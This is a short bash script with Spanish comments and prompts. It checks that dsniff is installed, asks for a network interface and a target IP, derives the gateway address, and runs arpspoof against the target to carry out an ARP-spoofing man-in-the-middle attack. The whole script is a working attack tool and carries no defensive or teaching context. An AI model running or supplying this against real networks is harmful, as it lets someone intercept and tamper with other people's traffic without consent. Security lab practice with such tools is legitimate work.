#!/bin/bash 

# Verificar si la herramienta existe en el ordenador 

check_herramienta() {
  if ! command -v "$1" &>/dev/null; then 
    echo "Error: $1 No esta instalado. Instala $1 y vuelve a intentarlo."
    exit 1

  fi
}

check_herramienta "dsniff"

read -p "Introduce la interfaz de red a analizar: " interfaz
read -p "Introduce la IP del Objetivo: " ip

puerta_de_enlace="${ip%.*}.1"

echo "Interfaz seleccionada: $interfaz"
echo "IP objetivo: $ip"
echo "Puerta de enlace calculada: $puerta_de_enlace"

arpspoof -i "$interfaz" -t "$ip" "$puerta_de_enlace"
